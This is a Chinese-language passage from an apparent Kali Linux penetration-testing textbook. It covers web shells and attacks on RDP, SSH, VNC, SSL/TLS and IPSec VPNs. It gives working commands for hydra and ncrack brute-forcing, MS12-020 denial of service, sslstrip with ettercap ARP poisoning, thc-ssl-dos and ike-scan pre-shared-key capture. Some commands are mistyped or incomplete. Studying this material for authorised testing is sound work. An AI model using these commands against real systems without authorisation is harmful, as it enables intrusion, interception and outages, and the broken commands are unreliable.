  网站中最常见且易被利用的漏洞是注入漏洞，发生在受害者网站未监控用户输入，从而允许攻击者与后端系统交互。攻击者可以构造输入数据来修改或窃取内容。\n\n```bash\n\
  sqlmap\n```\n*(由于原文此处存在大量重复的段落，已根据要求进行翻译并保留核心结构)*\n\n\n\n\n在后续截图所示的示例中，我们已经通过 `whoami`\
  \ 命令（该命令可以识别出正确的目录）和 `ls` 命令（用于获取文件列表，这再次确认了连接源为 `weevely.php`）验证了我们已连接到 web shell。我们使用\
  \ `cat /etc/password` 命令查看了密码。\n\n![](img/index-273_1.png)\n\nWeb shell 还可以用于建立返回到测试者的反向壳（reverse\
  \ shell）连接，可以使用 `Netcat` 或 `Metasploit Framework` 作为本地监听器。\n\n## 总结\n在本章中，我们从攻击者的视角检查了网站及其向授权用户提供的服务。我们将“杀伤链”（kill\
  \ chain）视角应用于 Web 服务，以理解侦察和漏洞扫描的正确应用。\n\n文中介绍了了几种不同的漏洞扫描器；我们重点关注了对现有扫描器进行制作和修改，以支持对网站和\
  \ Web 服务的评估、基于浏览器的漏洞扫描器，以及专门用于评估网站及其服务的漏洞扫描器。我们只审查了少数几个利用程序，并通过检查针对 Web 服务的 Web\
  \ shell 完成了本章。\n\n在下一章中，我们将学习如何识别和攻击连接用户到 Web 服务的远程访问通信。\n\n**[256]**\n\n## 攻击远程访问通信\n\
  \n在*第 9 章*《基于 Web 的应用程序的侦察与利用》中，我们将杀伤链方法应用于基于 Web 的应用程序。我们审查了专门适用于网站和其他应用程序的侦察、漏洞扫描和利用方法论。我们还审查了评估基于\
  \ Web 的应用程序所需的特殊工具，特别是客户端代理和如 web shell 之类的后渗透工具。\n\n在本章中，我们将重点关注对在互联网上泛滥的设备和应用程序的远程访问通信进行破解。\n\
  \n攻击者正在利用这些远程访问通信的普遍性来实现以下目标：\n\n• 利用现有的通信通道以获得对目标系统的直接远程访问\n• 拦截通信\n• 拒绝经过身份验证的用户对常规通信的访问，并迫使他们使用可能受到其他攻击影响的不安全通道\n\
  \n由于大多数用户认为他们正在使用“安全”的通信工具（即使是银行也依赖 `SSL` 协议来确保在线银行安全），这些攻击可能对受破坏的通信本身以及受害者对其他在线通信的信任产生重远影响。\n\
  \n本章将重点关注与远程访问通信相关的杀伤链中的侦察和利用阶段。它将不涵盖拨号攻击、IP 语音（VoIP）及相关的电话问题、如专用自助机的高度专有系统，以及值得专门成书的复杂应用程序。*利用远程访问通信*\n\
  \n在本章结束时，你将学习以下内容：\n\n• 利用操作系统通信协议（`RDP` 和 `SSH`）\n• 利用远程访问应用（`VNC`）\n• 配置 `Kali`\
  \ 进行 `Secure Sockets Layer2` 扫描\n• 对 `Secure Sockets Layer` 的侦察和利用，包括中间人攻击和拒绝服务攻击\n\
  • 攻击虚拟专用网络\n\n### 破解操作系统通信协议\n某些协议以明文传输访问凭据（`Telnet` 和 `FTP`）。使用如 `Wireshark` 等数据包嗅探器将攻击者拦截并重用凭据。\n\
  \n然而，大多数远程访问协议（尤其是嵌入操作系统中的协议）现在都受到访问控制和加密的保护。尽管这增加了安全性，但它们仍然可能由于配置错误或使用糟糕的加密密钥而遭受攻击。在本节中，我们将检查可以被利用以破坏所谓安全通信通道的其他风险。\n\
  \n### 破解远程桌面协议\n`远程桌面协议（RDP）` 是微软的一种专有通信协议，允许客户端使用图形用户界面连接到另一台计算机。尽管该协议经过了加密，但如果攻击者猜中了用户名和密码，就可以获得服务器的访问权限。\n\
  \n需要注意的是，`RDP` 最常见的破解方式是社会工程学。针对 `RDP` 的利用程序（exploits）非常常见，恶意软件也日益增加。\n\n**[258]**\n\
  \n## 第 10 章\n\n从测试者（或攻击者）的角度来看，破解目标 `RDP` 服务的第一步是使用 `nmap` 定位 `3389` 端口。\n\n`nmap`\
  \ 工具现在包含了关于 `RDP` 的详细信息的脚本，如果时间允许且不考虑隐蔽性，则应在初始阶段使用这些脚本。调用枚举加密协议的命令行如下：\n\n```\n\
  root@kali:~# nmap -p 3389 --script rdp-enum-encryption <IP>\n```\n\n该命令的执行结果如下截图所示：\n\
  \n由于已经识别了某些 `RDP` 漏洞（特别是 `MS12-020`），可以使用构造的数据包对其进行远程利用。\n\n要确定当前的 `RDP` 版本是否存在漏洞，请使用相应的\
  \ `nmap` 脚本执行以下命令行：\n\n```bash\nroot@kali:~# nmap -sV -p 3389 --script rdp-vuln-ms12020\
  \ <IP>\n```\n\n**[259]**\n\n*利用远程访问通信*\n\n该命令的执行结果如下所示：\n\n![](img/index-277.png)\n\
  \n一旦使用 `nmap` 识别出漏洞系统，可以使用 `Metasploit Framework` 中的 `auxiliary/dos/windows/rdp/ms12020_maxchannelids`\
  \ 模块导致拒绝服务。\n\n破解 `RDP` 最的方法是基于常用用户名和密码字典的暴力破解攻击（针对 `RDP` 的恶意软件攻击也变得越来越普遍）。\n\n\n\
  \n\n\n```bash\nroot@kali:~# ncrack -vv -U user.lst -P password.list <Taget IP>:<Target\
  \ Port>\n```\n\n上述命令的执行结果如下图所示：\n\n![](img/index-278_1.png)\n\n`ncrack` 工具在大约 1,700\
  \ 秒内发现了所有用户的访问凭据。然而，所需的时间取决于所用字典的总体大小以及在获得成功之前必须进行多少次尝试。\n\n**[ 261 ]**\n\n### 破解远程访问通信\n\
  \n#### 破解 Secure Shell\n\n`secure shell`（即 `SSH`）协议是一种网络协议，用于在跨越开放网络的网络上在服务器和客户端之间建立加密通道。通常情况下，公私钥对允许用户在不需要密码的情况下登录系统。公钥存在于所有需要安全连接的系统中，而用户则秘密保存私钥。身份验证基于私钥；`SSH`\
  \ 通过公钥验证私钥。在目标系统上，公钥将与允许远程访问系统的授权密钥列表进行比对。当公钥在密码学上不强强大且可以被破解时，这种所谓的安全通信通道就会失效。\n\
  \n与 `RDP` 一样，`SSH` 容易受到猜测用户访问凭据的暴力破解。对于这个特定的示例，我们将使用一个名为 `hydra` 的工具。`hydra` 工具可能是最老的暴力破解工具，而且是功能最丰富的工具。它还支持针对最多目标协议的攻击。\n\
  \n通过导航到 `Kali Linux` | `Password Attacks` | `Online Attacks` 可以找到 `hydra` 工具，也可以直接从命令行调用它。`hydra`\
  \ 有两个版本：命令行版本（`hydra`）和 GUI 版本（`hydra-gtk`）。在本示例中，我们将使用以下命令从命令行调用 `hydra`：\n\n```bash\n\
  root@kali:~# hydra -s 22 -v -V -L <file path/name> -P <file path/name> -t 8 <Target\
  \ IP><protocol>\n```\n\n命令参数描述如下所示：\n\n- `-s` 指定要使用的端口。虽然在打算使用默认端口时不需要输入，但它是为了消除歧义，并且在这种情况下可以加快测试速度。\n\
  - `-v` 和 `-V` 选择报告的最大详细程度。\n- `-L` 选择登录或用户名文件。\n- `-P` 选择密码文件。\n- `-t` 选择并行任务或连接的数量。数字越大，测试运行越快。然而，如果数字太高，可能会引入错误并漏掉正确的密码。\n\
  \n**[ 262 ]**\n\n### 第 10 章\n\n接下来的截图显示了初始暴力破解攻击的详细输出：\n\n![](img/index-280_1.png)\n\
  \n当使用字典成功登录时，`hydra` 会报告端口、协议、主机和登录凭据。随后，它会继续使用字典来识别其他可能的账户。在以下截图的最顶行中，`Hydra` 正确识别出了一个\
  \ `SSH` 账户，其登录名为 `DigitalDefence`，密码为 `darkstar`；截图还显示了 `Hydra` 在尝试识别额外账户时所做的其他尝试。\n\
  \n![](img/index-280_2.png)\n\n如果你知道密码配置，还可以使用以下命令通过 `hydra` 动态创建密码列表：\n```bash\n\
  root@kali:~# hydra –L user.lst –V –x 6:8:aA1 <IP address> SSH\n```\n\n**[ 263 ]**\n\
  \n### 破解远程访问通信\n\n上述命令中使用的参数描述如下：\n\n- `-x` 指导 `Hydra` 自动创建用于暴力破解的密码。密码将根据 `-x`\
  \ 之后的参数创建。\n- `6:8` 表示密码最小长度为六字符，最大长度为八字符。\n- `aA1` 将自动使用字母和数字的组合创建密码。它将使用所有小写字母（由\
  \ `a` 表示）、所有大写字母（由 `A` 表示）以及数字 0 到 9（由 `1` 表示）。\n\n你也可以向生成的列表添加特殊字符，但你需要在 `-x` 选项周围加上单引号，如下所示所示：\n\
  ```bash\nroot@kali:~# -L user.lst –V –x '6:8:aA1 !@#$' <IP address> SSH\n```\n\n\
  #### 破解第三方远程访问应用程序\n\n绕过系统协议提供远程访问的应用程序曾非常流行。尽管它们现在正在被 `GoToMyPC` 或 `LogMeIn` 等在线服务取代，但它们仍然相当常见。此类程序的示例包括\
  \ `pcAnywhere` 和 `VNC`。\n\n应当注意的是，由于系统管理员的合法操作，网络中可能存在这些工具实例。然而，它们也可能因为网络已被入侵，攻击者需要一种远程访问网络的方法。\n\
  \n在下面的示例中，我们将使用 `Metasploit Framework` 的内置功能破解 `VNC`。\n\n1. 使用 `nmap` 在目标机器上定位远程访问软件。如下截图所示，通常可以找到\
  \ `VNC`。\n![](img/index-281_1.png)\n\n**[ 264 ]**\n\n### 第 10 章\n\n2. 使用 `msconsole`\
  \ 命令激活 `Metasploit Framework`。在 `msf` 提示符下配置其破解 `VNC`，如下所示：\n![](img/index-282_1.png)\n\
  \n3. 如下所示启动 `run` 命令，等待成功运行：\n![](img/index-282_2.png)\n\n4. 最后，一旦 `Metasploit`\
  \ 确定了凭据，通过登录 `Vnc` 客户端来验证它们。\n```bash\nroot@kali:~# vncviewer <Target IP>\n```\n\
  \n**[ 265 ]**\n\n### 破解远程访问通信\n\n这将连接到远程主机并提示输入相应的凭据。身份验证成功后，将打开一个窗口，让你远程访问目标。如下所示，通过\
  \ `whoami` 查询来确认你位于目标系统，并请求系统 ID 或 IP 地址：\n![](img/index-283_1.png)\n\n#### 攻击 Secure\
  \ Sockets Layer\n\n`Secure Sockets Layer`（SSL）及其继任者 `Transport Layer Security`（TLS）是用于在互联网上提供安全通信的加密协议。这些协议被广泛应用于安全消息、电子邮件、网页浏览和网络语音。\n\
  \n**[ 266 ]**\n\n这些协议在互联网上无处不在，但它们起源于 20 世纪中期，随着时间的推移日益受到攻击。SSL` 2.0 版本（1.0 版本从未公开发布）包含许多可以被利用的漏洞，例如密钥控制不良以及容易受到中间人攻击。尽管大多数用户已采用该协议的\
  \ 3.0 版本或更新的 `TLS` 版本，但配置错误的系统可能允许使用早期的不安全版本。\n\n**配置 Kali 以扫描 SSLv2** 在开始侦察阶段之前，验证\
  \ `Kali` 是否配置为扫描 `SSL` 版本 2 协议。在编写本书时，情况并非如此。\n\n从终端窗口输入以下命令：\n```bash\nroot@kali:~#\
  \ openssl_s_client -connect www.opensecurityresearch.com:443 -ssl2\n```\n\n如果返回了未知选项\
  \ `-ssl2` 错误（如下所示），则需要额外的配置。\n\n![](img/index-284_1.png)\n\n要应用修复，你需要使用以下步骤重新补丁\
  \ `OpenSSL` 应用程序（确保使用的路径反映了下载目录）：\n\n\n\n\n\n1. 使用以下命令安装 `quilt`，这是一个用于管理针对应用程序源代码的多个补丁的程序：\n\
  \n```bash\nroot@kali:~# apt-get install devscripts quilt\n```\n\n2. 下载 `openssl`\
  \ 源码，验证已应用的补丁，更新配置文件，然后重新构建应用程序。使用以下命令：\n\n```bash\nroot@kali:~# apt-get source\
  \ openssl\nroot@kali:~# cd openssl-1.0.1e\nroot@kali:~/openssl-1.0.1e# quilt pop\
  \ -a\n```\n\n[267]\n\n*利用远程访问通信漏洞*\n\n3. 编辑 `/openssl-1.0.1e/debian/patches/series`\
  \ 文件，并从文件中删除以下行：\n\n`ssltest_no_sslv2.patch`\n\n4. 编辑 `/openssl-1.0.1e/debian/rules`\
  \ 文件，删除 `no-ssl2` 参数。然后，对 `openssl` 重新应用补丁。使用以下命令：\n```bash\nroot@kali:~/openssl-1.0.1e#\
  \ quilt push -a\nroot@kali:~/openssl-1.0.1e# dch -n 'Allow SSLv2'\n```\n\n5. 完成后，重新构建\
  \ `openssl` 包并重新安装。此步骤可以使用以下命令执行：\n\n```bash\nroot@kali:~/openssl-1.0.1e# dpkg-source\
  \ --commit\nroot@kali:~/openssl-1.0.1e# debuild -uc -us\nroot@kali:~/openssl-1.0.1e#\
  \ cd /root\nroot@kali:~# dpkg -i *ssl*.deb\n```\n\n6. 通过重新执行使用 `SSLv2` 连接的命令来确认补丁已成功应用，如下所示：\n\
  \n![](img/index-285_1.png)\n\n依赖 `openssl` 的 Kali 脚本（特别是 `sslscan`）需要重新编译。要重新编译，首先下载源码然后重新构建。完成后，使用以下命令重新安装：\n\
  \n```bash\nroot@kali:~# apt-get source sslscan\nroot@kali:~# cd sslscan-1.8.2\n\
  root@kali:~/sslscan-1.8.2# debuild -uc -us\nroot@kali:~/sslscan-1.8.2# cd /root\n\
  rootl@kali:~# dpkg -i *sslscan*.deb\n```\n\n[268]\n\n## 第 10 章\n\nKali 关于 `SSLv2`\
  \ 的问题可能会在未来的版本中修复，因此在测试 SSL 连接之前，请验证这一点。\n\n### SSL 连接的侦察\n\n在评估 SSL 连接时，杀伤链的侦察阶段仍然非常重要，特别是审查以下项目时：\n\
  \n* 用于识别建立安全 SSL 连接的参与方的 `x.509` 证书\n* 使用的加密类型\n* 配置信息，例如是否允许 SSL 会话的自动重协商\n\nSSL\
  \ 证书可以提供可能用于辅助社交工程的信息。\n\n更频繁的是，测试人员或攻击者想要确定证书是否有效。无效的证书可能是由于签名检查错误、证书链断、证书中指定的域名与系统不匹配，或者证书过期、被吊销或已知被攻破导致的。\n\
  \n如果用户之前接受过无效证书，他们很可能会接受一个新的无效证书，这使得攻击者的工作变得容易得多。\n\n用于保护 SSL 连接的加密类型特别重要。加密算法分为以下几类：\n\
  \n* **空算法 (Null ciphers)**：这些算法用于验证传输的真实性和/或完整性。由于没有应用任何加密，它们不提供任何安全性。\n* **弱算法\
  \ (Weak ciphers)**：这是一个用于描述所有密钥长度为 128 位或以下的算法的术语。使用 `Diffie-Hellman algorithm`\
  \ 进行密钥交换的算法也被认为是，因为它们容易受到中间攻击。使用 `MD5` 哈希可能由于碰撞攻击被认为是弱的。最后，最近针对 `RC4` 的攻击也对其持续使用提出了质疑。\n\
  * **强算法 (Strong ciphers)**：这些是超过 128 位的算法。目前接受的、安全的选项是带有 256 位密钥的 `AES` 加密。如果可能，应配合\
  \ `Galois/Counter mode` 使用，这是一种支持认证和加密的现代块密码。\n\n[269]\n\n*利用远程访问通信漏洞*\n\nSSL 和\
  \ TLS 依赖密码套件（认证、加密和消息验证码算法的特定组合）来为每个连接建立安全设置。有 30 多种这样的套件，并且为每个安全需求选择最佳选项的复杂性经常导致用户默认选择安全性较低的选项。因此，每个\
  \ SSL 和 TLC 连接都必须经过测试。\n\n对 SSL 连接进行侦察，请使用 `nmap` 的 `NSE` 模块或特定的 SSL 应用程序。下表描述了\
  \ `nmap` 的 `NSE` 模块。\n\n| Nmap NSE 模块 | 模块功能 |\n| :--- | :--- |\n| `ssl-cert` |\
  \ 获取服务器的 SSL 证书。返回信息的量取决于详细程度（`none`, `-v`, 和 `-vv`）。 |\n| `ssl-date` | 获取目标的 SSL\
  \ 时间。 |\n| `ssl-enum-ciphers` | 重复启动 SSL 和 TLS 连接，每次尝试新算法。 |\n| `ssl-google-cert`\
  \ | 查询 Google 证书目录 SSL 证书信息。 |\n| `ssl-known-key` | 检查主机使用的 SSL 证书指纹是否与数据库匹配。 |\n\
  | `sslv2` | Determine 服务器是否支持过时且安全性较低的 SSL 版本 2。 |\n\n要从命令行调用单个脚本，请使用：\n```bash\n\
  root@kali:~# nmap --script <script name> -p 443 <Target IP>\n```\n\n[270]\n\n##\
  \ 第 10 章\n\n在下面的示例中，使用 `-vv` 选项调用 `ssl-cert` 脚本以获得最大的详细程度。该脚本的数据如截图所示：\n\n![](img/index-288_1.png)\n\
  \n在侦察期间，测试人员可以选择以下命令启动所有 SSL 专用模块：\n\n```bash\nroot@kali:~# nmap --script \"ssl*\"\
  \ <IP address>\n```\n\nKali 针对 SSL 的侦察和攻击工具可以从命令行调用，也可以通过菜单导航到 **Kali Linux** |\
  \ **信息收集** | **SSL 分析** 进行选择。这些工具如下表所示：\n\n| 工具 | 功能 |\n| :--- | :--- |\n| `sslaudit`\
  \ | 自动化测试 SSL 和 TLS 客户端以确定对中间攻击的抵抗力。 |\n| `ssldump` | 对 SSLv3 和 TLS 通信进行网络协议分析。\
  \ |\n| `sslscan` | 查询 SSL 服务以确定支持哪些算法。 |\n| `sslsniff` | 在特定局域网上的所有 SSL 连接上启用中间攻击条件。\
  \ |\n| `sslsplit` | 对 SSL 和 TLS 网络执行中间攻击。 |\n| `sslstrip` | 设计用于透明地劫持网络上的 HTTP 流量，监控\
  \ |\n\n\n\n\n\nHTTPS 链接，并重定向并将这些链接映射到伪造的 HTTP 或 HTTPS 链接。它还支持提供看起来像锁图标的 favicon\
  \ 的模式，以及对拦截的通信进行选择性记录。\n\n`sslyze` 分析服务器的 SSL 配置。\n\n`tlssled` 统一了其他几个 SSL 专用应用程序的使用和输出，检查加密强度、证书参数和重协商能力。\n\
  \n常用的程序是 `sslscan`，它通过查询 SSL 服务来确定证书详情和支持的加密套件。输出为文本和 XML 格式。\n\n在测试特定连接时，使用 `--no-failed`\
  \ 选项（如下截图所示），可以使 `sslscan` 只显示被接受的加密套件。\n\n![](img/index-289_1.png)\n\n[272]\n\n\
  ## 第 10 章\n\nPython 工具 `sslyze` 分析服务器的 SSL 配置并验证证书，测试弱加密套件并识别可能支持额外攻击的配置信息。在下图中所示的示例输出中，它识别出了证书不匹配问题，这可能支持某些攻击类型。\n\
  \n![](img/index-290_1.png)\n\n另一个 SSL 侦察工具是 `tlssled`，如下所示。它运行非常快，操作简单，且输出对用户友好。\n\
  \n[273]\n\n### 攻击远程访问通信\n\n![](img/index-291_1.png)\n\n无论你使用何种 SSL 侦察方法，请确保通过运行至少两个不同的工具来交叉验证你的结果。此外，并非所有配置了\
  \ SSL 的设备都会同时在线。因此，在大规模网络中，请确保在测试过程中多次扫描 SSL 漏洞。\n\n目前正在开发中的新工具是 OWASP 的 O-Saft\
  \ (www.owasp.org/index.php/O-Saft)，它提供了 SSL 配置、加密套件和证书数据的全面概览。\n\n[274]\n\n## 第\
  \ 10 章\n\n### 使用 sslstrip 进行中间人攻击\n\n尽管 SSL 保护提供了安全性，但针对该协议仍存在一些有效的攻击。2009 年，Moxie\
  \ Marlinspike 展示了 `sslstrip`，该工具可以透明地劫持网络上的 HTTP 流量，并将流量重定向为看似 HTTP 或 HTTPS 的链接。它移除了\
  \ SSL 保护并向受害者的浏览器返回*受保护的*锁图标，使得拦截无法被立即发现。\n\n简之，`sslstrip` 对 SSL 发起中间人攻击，允许之前受保护的数据被拦截。\n\
  \n要使用 `sslstrip`，必须通过以下命令将拦截系统配置为转发模式：\n\n```bash\nroot@kali:~# echo \"1\" > /proc/sys/net/ipv4/ip_forward\n\
  ```\n\n接下来，使用以下命令设置 `iptables` 防火墙，将 HTTP 流量重定向到 `sslstrip`：\n\n```bash\nroot@kali:~#\
  \ iptables –t nat –A PREROUTING –p tcp –destination-port 80 –j REDIRECT –to-port\
  \ <listenport>\n```\n\n在此示例中，监听端口已设置为端口 5353。\n\n配置完成后，使用以下命令运行 `sslstrip`：\n```bash\n\
  root@kali:~# sslstrip –l 5353\n```\n\n上述命令的执行结果如下所示：\n\n![](img/index-292_1.png)\n\
  \n最小化正在执行 `sslstrip` 的活动终端窗口，并打开一个新的终端窗口。使用 `ettercap` 伪造 ARP 并使用以下命令将来自网络或目标系统的流量重定向到拦截系统：\n\
  ```bash\nroot@kali:~# ettercap –TqM arp:remote /192.168.75.128/ /192.168.75.2/**\n\
  ```\n\n[275]\n\n### 攻击远程访问通信\n\n在这里，`ettercap -T` 关选择纯文本界面，`-q` 强制控制台进入静默模式，`M`\
  \ 激活中间人攻击以劫持并重定向数据包。`arp:remote` 开关实现 ARP 毒攻击，并将攻击者置于中间位置，能够查看并修改传输中的数据包。如果你想查看通过网关的远程\
  \ IP 地址和通信，则需要开关的远程部分。\n\n上述命令的执行结果如下所示：\n\n![](img/index-293_1.png)\n\n如果目标系统访问受\
  \ SSL 安全的内容，它们的查询将通过网关重定向到拦截系统。\n\n[276]\n\n## 第 10 章\n\n从用户的角度来看，他们将被引导至该网站并看到**此网站的安全证书存在问题**的安全警报，提示他们做出继续的决定。如果他们选择“是”，将被引导到所选页面。浏览器右下角的锁图标仍将显示\
  \ SSL 已启用，表明他们的通信是安全的。\n\n在后台，`sslstrip` 工具移除了 SSL，留下可以在 `ettercap` 日志中查看的原始内容，如下所示：\n\
  \n![](img/index-294_1.jpg)\n\n这种攻击仅在同一个二层网络段内有效。然而，它在有线和无线网络上都是成功的。虽然 ARP 重定向可以应用于网段，但此类攻击会影响网络带宽，可能会被检测。因此，针对单个设备实施这种攻击最为有效。\n\
  \n要禁用 `PREROUTING` 规则，将 `-A` 替换为 `-D`。要清除防火墙规则，使用 `iptables –t nat –F`（刷新命令）和 `iptables\
  \ –t nat –L`（验证表已清空）。\n\n### 针对 SSL 的拒绝服务攻击\n\n当建立 SSL 连接时，服务器必须完成一系列计算密集型计算以启动握手并开始加密。这涉及客户端少量的计算工作，以及服务器端更大量的计算工作。\n\
  \n如果客户端发起 SSL 连接但拒绝服务器的响应，则 SSL 连接将无法建立。然而，如果 SSL 服务器配置为自动重新协商连接，则计算负载将导致拒绝服务（DoS）。\n\
  \n[277]\n\n### 攻击远程访问通信\n\nKali Linux 拥有多个工具允许你判断是否允许自动重协商，包括 `sslyze` 和 `tssled`。\n\
  \n如果允许自动重协商，输入以下命令将允许测试人员评估对 DoS 攻击的防御性：\n\n```bash\nroot@kali:~# thc-ssl- dos <IP\
  \ address> <port>\n```\n\n上述命令的执行结果如下：\n\n![](img/index-295_1.png)\n\n### 攻击 IPSec\
  \ 虚拟专用网络\n\n**虚拟专用网络** (**VPN** ) 使用互联网为远程位置或同一网络内的用户提供安全的（加密的）通信。IPSec 是最常建立网络间安全连接以及连接虚拟专用网络主机的协议。\n\
  \n在 IPSec 内部，有几个子协议执行特定功能，例如：\n\n- **身份验证头** (**AH**)：它为 IP 数据包提供源证明，保护其免受重放攻击。\n\
  - **封装安全负载** (**ESP**)：该协议为传输数据提供源真实性、完整性和机密性。\n\n[278]\n\n## 第 10 章\n\n- **安全关联**：这是用于加密和\n\
  \n\n\n\n验证传输数据的身份。由于 `SA` 与单向数据传输相关，双向通信通过一对安全关联（security associations）来保护。安全关联使用`Internet\
  \ Security Association and Key Management Protocol`（`ISAKMP`）建立，可以通过多种方式实现。在测试 `VPN`\
  \ 的安全性时，最脆弱的配置之一依赖于预共享密钥，即`Internet Key Exchange`（`IKE`）。\n\n为了评估 `VPN` 的安全性，测试人员遵循以下基本步骤：\n\
  \n1. 扫描是否存在 VPN 网关。\n2. 对 VPN 网关进行指纹识别，以确定厂商和配置细节。\n3. 寻找与 VPN 厂商或相关产品相关的漏洞。\n4.\
  \ 捕获预共享密钥。\n5. 执行离线 PSK 破解。\n6. 检查默认用户账户。\n\n### 扫描 VPN 网关\n要扫描 VPN 网关是否存在，请使用 `nmap`\
  \ 或 `ike-scan`。使用 `nmap` 时执行以下命令：\n\n```\nroot@kali@:~# nmap --sU -Pn -p 500 <IP\
  \ Address>\n```\n\n在此示例中，`-sU` 指示 `nmap` 使用 UDP 包（而不是 TCP）扫描主机范围内可能的目标，`-Pn` 确保\
  \ `nmap` 不发送 ping 扫描（这可能会让目标发现扫描并识别出测试人员），而 `-p 500` 指定了要扫描的特定端口。\n\n由于 `nmap` 处理\
  \ `IKE` 包的方式，该工具无法定位所有的 VPN 网关；最有效的工具是能够向目标系统发送格式正确的 `IKE` 包并显示返回消息的工具。\n\n定位 VPN\
  \ 网关的最优工具是 `ike-scan`（可以通过导航到 `Kali Linux` | `Information Gathering` | `VPN Analysis`\
  \ 找到）。`ike-scan` 命令行工具使用 `IKE` 协议发现并识别私有网的指纹。它还支持在 `IKE` 攻击模式下破解预共享密钥。使用 `ike-scan`\
  \ 定位目标，执行以下命令：\n\n```\nroot@kali@:~# ike-scan -M <Target IP>\n```\n\n**[ 279 ]**\n\
  \n#### 利用远程访问通信\n上一条命令的执行结果如下截图所示：\n\n![](img/index-297_1.png)\n\n`-M` 选项将每个有效负载返回一行，简化了输出。\n\
  \n`ike-scan` 工具会对目标设备测试各种转换集（transforms）。一个转换包含多个属性：加密算法（`DES` 和 `3DES`）、哈希算法（`MD5`\
  \ 和 `SHA1`）、身份验证方法（预共享密钥）、Diffie-Hellman 组（选项一为 768 位，选项二为 1024 位）以及生存时间（28,800\
  \ 秒）。它将识别哪些转换触发了成功的响应。\n\n在完成对每个识别出的设备进行 `ike-scan` 后，程序将返回以下结果之一：\n\n* `0 returned\
  \ handshake; 0 returned notify`：表示目标不是 IPSec 网关。\n* `0 returned handshake; 1 returned\
  \ notify`：表示尽管存在 VPN 网关，但 `ike-scan` 提供的任何转换都是不可接受的。\n* `1 returned handshake; 0\
  \ returned notify`：如之前的截图所示，这表示目标已配置了 IPSec，并将针对其提供的一个或多个转换执行 `IKE` 协商。\n\n### 对\
  \ VPN 网关进行指纹识别\n如果你能与 VPN 网关建立握手，就可以对设备进行指纹识别并返回以下信息：\n\n* 厂商和型号\n* 软件版本\n\n这些信息用于识别针对特定厂商的攻击或微调通用攻击。\n\
  \n**[ 280 ]**\n\n#### 第 10 章\n如果 `VPN` 由防火墙托管，则指纹识别还将识别出正在使用的防火墙。\n\n由于 `IKE` 无法保证传输包的可靠性，大多数\
  \ VPN 网关厂商使用专有协议来处理看似丢失的流量。`ike-scan` 工具向 VPN 网关发送 `IKE` 探测包，但它不对收到的响应进行回复。服务器的就像包已丢失，并执行其退避策略（backoff\
  \ strategy）重新发送包。通过分析包之间的时间差和重试次数，`ike-scan` 可以识别出厂商。\n\n在后续截图所示的示例中，`-M` 选项导致每个负载单独显示，使输出更易读。`ike-scan`\
  \ 的 `-showbackoff` 选项（如下截图所示）会记录所有发送和接收包的响应时间，然后记录 60 秒的延迟后显示结果。\n\n![](img/index-298_1.png)\n\
  \n在之前的截图中，`Vendor ID`（`VID`）是一个特定于厂商的 MD5 哈希字符串，用于识别专有通信或特定的通信细节。\n\n`ike-scan`\
  \ 工具还可以用于判断网关是否支持攻击模式（aggressive mode）。如果支持，则很难与服务器建立握手，因为在作为身份识别负载的一部分提供有效 ID 之前，它不会做出响应。\n\
  \n**[ 281 ]**\n\n#### 利用远程访问通信\n\n##### 捕获预共享密钥\n可以使用 `ike-scan` 工具将 VPN 网关推入攻击模式。这非常重要，因为\
  \ IPSec 的攻击模式并不保护预共享密钥。身份验证凭据以明文发送，可以被捕获并使用离线工具进行破解。\n\n以下针对 Cisco VPN 集中器的示例使用了以下命令：\n\
  \n```\nroot@kali@:~# ike-scan --pskcrack --aggressive --id=<target>\n```\n\n上一条命令的执行结果如下所示：\n\
  \n![](img/index-299_1.jpg)\n\n如果你希望将结果重定向到文本文件以便额外的分析和离线破解，请使用以下命令：\n\n```\nroot@kali@:~#\
  \ ike-scan --pskcrack --aggressive --id=<target> > psk.txt\n```\n\n##### 执行离线 PSK\
  \ 破解\n在使用离线工具破解捕获的哈希之前，编辑输出文件仅包含哈希值（它应包含冒号分隔的值）。破解密钥的最有效工具是 `psk-crack`，它支持字典破解和混合破解。\n\
  \n**[ 282 ]**\n\n#### 识别默认用户账户\n与所有的离线破解练习一样，成功取决于工作和投入（时间、计算量以及电力系统的能量投入）。如之前的截图所示，强预共享密钥需要很长时间才能破解。\n\
  \n与大多数其他硬件设备一样，VPN 网关在安装时通常包含默认用户账户。管理员可能没有更改它们。利用指纹识别过程中收集的信息，测试人员可以网络搜索来识别标准用户账户。\n\
  \n如果测试人员访问用户的计算机，用户名凭据通常以明文存储在系统注册表中。此外，如果测试人员访问系统内存，可以从客户端系统的内存转储中获取密码。\n\n`VulnVPN`(www.rebootuser.com)\
  \ 是一个虚拟操作系统和存在漏洞的 VPN 服务器。它允许你应用本章描述的工具来破坏应用程序并获取 root 权限，而不会损坏生产系统。\n\n**总结**在本章中，我们研究了如何利用常见的远程访问应用程序，包括为了提供额外安全而加密的程序。我们利用了操作系统通信协议（`RDP`\
  \ 和 `SSH`）以及 `VNC` 等应用程序。我们还学习了对安全套层连接和虚拟私有网络进行侦察，以及降低加密有效性的攻击类型。\n\n\n\n在下一章中，我们将看到针对特定通信通道结合针对人类的联合攻击结果。在检查这些客户端漏洞利用的有效性时，我们将回顾几种类型的攻击以及\
  \ `Browser Exploitation Framework`（`BeEF`）项目。\n\n[283]\n\n# 客户端漏洞利用\n\n对于攻击者或有效的渗透测试人员来说，最大的挑战是绕过目标的安全控制以实现突破。当目标位于网络上的系统时，这可能是困难的，因为攻击者通常需要绕过防火墙、代理、入侵检测系统以及深度防御架构中的其他元素。\n\
  \n一种成功的规过策略是直接针对客户端应用程序。用户发起与客户端应用程序的交互，允许攻击者利用用户与应用程序之间存在的现有信任。社会工程学方法的使用将增强客户端攻击的成功率。\n\
  \n客户端攻击针对的是通常缺乏企业级系统中那种的安全控制（特别是防火墙和入侵检测系统）的系统。如果这些攻击成功并建立了持久通信，那么当客户端设备重新连接到目标网络时，就可以被用来发起攻击。\n\
  \n在本章结束时，你将学习到如何使用以下工具攻击客户端应用程序：\n\n• 恶意脚本攻击（VBScript 和 PowerShell）\n• 跨站脚本框架（Cross-Site\
  \ Scripting Framework）\n• 浏览器漏洞利用框架（Browser Exploitation Framework）\n\n## 客户端漏洞利用\n\
  \n### 使用恶意脚本攻击系统\n\n客户端脚本，如 `JavaScript`、`VBScript` 和 `PowerShell`，开发用于是将应用程序逻辑和动作从服务器移动到客户端计算机。从攻击者或测试人员的角度来看，使用这些脚本有几个优势，如下：\n\
